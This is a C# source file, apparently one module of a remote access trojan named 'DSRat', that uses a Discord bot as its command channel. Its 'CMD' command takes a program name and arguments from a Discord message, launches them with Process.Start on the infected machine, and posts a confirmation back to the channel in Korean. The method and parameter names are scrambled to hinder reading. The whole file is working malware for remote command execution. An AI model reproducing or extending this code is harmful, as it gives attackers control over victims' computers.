using Discord.Commands;
using System.Threading.Tasks;

namespace DSRat
{
    public class cmd : ModuleBase<SocketCommandContext>
    {

        [Command("CMD")]
        public async Task vkjalsnlvkjSNAKJNjdvklnskljVNSDKJNkLJANk127312798(string nASDBJKASNCkjvnwkalrnvkjlanjklsvbSHDl1347913y7ABKJN, string asdnjasdnjaksnSABHKJFBDKJA32748937298)
        {
            //ModuleBase를 상속하면 Context 변수를 통해 답장을 보낼 수 있다. 
            System.Diagnostics.Process.Start(nASDBJKASNCkjvnwkalrnvkjlanjklsvbSHDl1347913y7ABKJN, asdnjasdnjaksnSABHKJFBDKJA32748937298);
            await Context.Channel.SendMessageAsync(nASDBJKASNCkjvnwkalrnvkjlanjklsvbSHDl1347913y7ABKJN + asdnjasdnjaksnSABHKJFBDKJA32748937298 + "명령어가 성공적으로 처리되었습니다");
        }
    }
}